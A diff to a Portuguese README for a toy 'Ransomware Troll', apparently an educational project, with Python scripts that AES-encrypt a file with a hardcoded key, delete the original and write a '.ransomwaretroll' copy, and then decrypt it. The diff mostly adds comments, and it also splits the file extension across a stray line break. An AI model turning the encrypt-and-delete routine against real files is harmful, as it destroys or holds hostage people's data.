@@ -1,6 +1,6 @@
 # Documentação do Ransomware Troll
 
-Esta documentação fornece informações sobre o Ransomware Troll, um programa de criptografia de arquivos malicioso, e mostra como descriptografar arquivos que foram afetados por ele. Este documento inclui uma descrição dos códigos base necessários para descriptografar e criptografar arquivos afetados pelo Ransomware Troll.
+Esta documentação fornece informações sobre o Ransomware Troll, um programa de criptografia de arquivos malicioso, e mostra como descriptografar arquivos que foram afetados por ele. Este documento inclui uma descrição detalhada dos códigos base necessários para descriptografar e criptografar arquivos afetados pelo Ransomware Troll.
 
 ## Descrição
 
@@ -18,21 +18,25 @@ Aqui está o código base que pode ser usado para descriptografar arquivos cript
 import os
 import pyaes
 
-## abrir o arquivo criptografado
+# Nome do arquivo criptografado
 file_name = "arquivo.txt.ransomwaretroll"
+
+# Abrir o arquivo criptografado em modo de leitura binária
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
+# Chave para descriptografia
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
+
+# Realizar a descriptografia
 decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
+# Remover o arquivo criptografado
 os.remove(file_name)
 
-## criar o arquivo descriptografado
+# Criar o arquivo descriptografado
 new_file = "arquivo.txt"
 new_file = open(f'{new_file}', "wb")
 new_file.write(decrypt_data)
@@ -49,33 +53,40 @@ Aqui está o código base que pode ser usado para criptografar arquivos usando o
 import os
 import pyaes
 
+# Nome do arquivo a ser criptografado
 file_name = "arquivo.txt"
+
+# Abrir o arquivo em modo de leitura binária
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
+# Remover o arquivo original
 os.remove(file_name)
 
+# Chave para criptografia
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
+# Realizar a criptografia
 crypto_data = aes.encrypt(file_data)
 
+# Nome do novo arquivo criptografado
 new_file = file_name + ".ransomwaretroll"
 new_file = open(f'{new_file}', 'wb')
 new_file.write(crypto_data)
 new_file.close()
 ```
 
-Certifique-se de substituir `"arquivo.txt"` pelo nome do arquivo que você deseja criptografar e `"testeransomwares"` pela chave correta de criptografia. O código criptografará o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransomwaretroll`.
+Certifique-se de substituir `"arquivo.txt"` pelo nome do arquivo que você deseja criptografar e `"testeransomwares"` pela chave correta de criptografia. O código criptografará o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransom
+
+waretroll`.
 
 ## Instruções
 
 Para descriptografar um arquivo afetado pelo Ransomware Troll, siga estas etapas:
 
-1. Cert
-
-ifique-se de ter instalado o Python em seu sistema.
+1. Verifique se você tem o Python instalado em seu sistema.
 
 2. Instale a biblioteca `pyaes` usando o comando `pip install pyaes`.
 
